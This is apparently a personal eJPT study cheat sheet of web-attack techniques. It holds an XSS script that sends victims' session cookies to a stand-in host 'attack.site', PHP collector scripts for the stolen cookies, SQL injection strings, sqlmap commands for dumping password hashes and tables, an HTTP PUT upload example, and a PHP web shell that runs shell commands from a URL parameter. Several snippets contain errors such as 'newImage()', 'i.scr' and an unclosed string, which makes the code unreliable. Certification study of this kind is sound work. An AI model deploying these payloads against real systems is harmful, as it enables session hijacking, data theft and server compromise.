# Web Application Tools
 My list of Web Application tools for the eJPT exam.

-------------------------------------

## *HTTP Protocol and Fingerprinting*

1. Netcat
    * nc [targetAddress] 80

2. OpenSSL s_client -connect [targetAddress:443]

3. httprint -P0 -h [targetAddress] -s /usr/share/httprint/signatures.txt

-------------------------------------

## *HTTP Verbs - Use in Burpsuite*

### (Can be used on misconfigured web servers)

- GET - Request a webpage
- HEAD - Request Header information
- POST - Post form data (eg, username, password)
- PUT - Create an arbitrary file on the server
- DELETE - Delete/remove file from the server
- OPTIONS - Check communications option

"GET" Example:

    GET /page.php?comman=pwd HTTP/1.1
    Host: www.host.com


"POST" Example:

    POST /login.php? HTTP/1.1
    Host: www.host.com


    username=admin&password=1234


"DELETE" Example:

    DELETE /wp-content/imp.file HTTP/1.1
    Host: www.host.com

"PUT" Example: 
    
    $wc -m payload.php
    20 payload.php

    $nc [targetAddress] 80
    PUT /payload.php HTTP/1.0
    Content-type: text/html
    Content-length: 20


    <?php phpinfo(); ?>

-------------------------------------

## *Dirbuster(GUI)/Gobuster/Dirb*

* Search for interesting file types
    * php
    * txt
    * bak
    * old

    $gobuster dir --url http://host.com/ -w /path/to/word.list -x php,txt,old,bak -o output.txt

    $dirb http://host.com/ /path/to/word.list -X php,txt,bak,old -o output.txt

    $dirb https://host.com/ (Simple SSL test)

*Tips: Searh for **Signup pages** and **old configuration files.***

-------------------------------------

## Cross-Site Scripting

* Session Cookies
    * document.cookie - This is where the cookies are stored

    *Display cookie as an alert*
    ``` 
    [<script>alert(document.cookie)</script>]
    ```
    *Victim's Browser* <--- **Inject this piece of code!**
    ```
    <script>
    var i = newImage();
    i.scr="http://attack.site/log.php?="+document.cookie;
    </script>
    ```

    *Attacker's Computer*
    ```
    <?php
    $filename="/tmp/log.txt;
    $fp=fopen($filename, 'a');
    $cookie=$_GET['q'];
    fwrite($fp, $cookie);
    fclose($fp);
    ?>
    ```
    *Alternate code*

    ```
    <?php
    $ip = $_SERVER['REMOTE_ADDR'];
    $browser = $_SERVER['HTTP_USER_AGENT'];

    $fp = fopen('jar.txt', 'a');

    fwrite($fp, $ip.' '. $browser." \n");
    fwrite($fp, urldecode($_SERVER('QUERY_STRING')). " \n\n");
    fclose($fp);
    ?>
    ```
-------------------------------------
## SQL-Injection

*Tip: Look at the source code to check for any IDs such as src="images/***els1***"!*
* SQL Statements

```
SELECT * FROM table WHERE <condition>;
```

Putting comments in statements
```
# Hash symbol
-- Double hyphens followed by a whitespace (add a space and another hyphen "-- -")

Select * FROM table; # Comment
Select * FROM table; -- Another comment
```

* BOOLEAN Attacks

````
SELECT * FROM items WHERE id='' OR '1' = '1'; -- -'
````

* Union Attacks

```
SELECT * FROM items WHERE id='' UNION SELECT null, null, null; -- -'
```

## SQLmap switches

```
Example:

$sqlmap -u "http://10.10.10.10/get.php?id=1234" -p id --technique=U

$sqlmap -u "http://10.10.10.10/login.php" --data "username=admin&password=1234" -p username --technique=B --banner
```

* -u URL
* -p vulnerable parameter
* --data data to be sent through a POST request (username=admin&password=1234)
* --banner Retrieve DBMS banner
* --users Enumerate DBMS users
* --passwords Enumerate DBMS Users hashed passwords
* --dbs Enumerate DBMS databases
* -D Database to enumerate (insert found database name)
* --tables Enumerates tables in the given database name
* -T Table name to enumerate (insert table name. E.g, Users, Accounts, etc)
* --columns Enumerate table columns
* -C Column name to enumerate (E.g., -C username,password)
* --dump Dumps all the table entries
* -r Load HTTP request from a file (Save the request from Burpsuite)
* --flush-session (Flushes the session files for the current target. Restarts the session again)





-------------------------------------

## *Reverse Shell Links*

[Pentest Monkey Website] (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[GTFOBins Website] (https://gtfobins.github.io/)


Example PHP Reverse Shell:

    <?php 
    if (isset($_GET['cmd']))
    {
        $cmd = $_GET['cmd'];
        echo '<pre>';
        $result = shell_exec($cmd);
        echo $result;
        echo '</pre>';
    }
    ?>

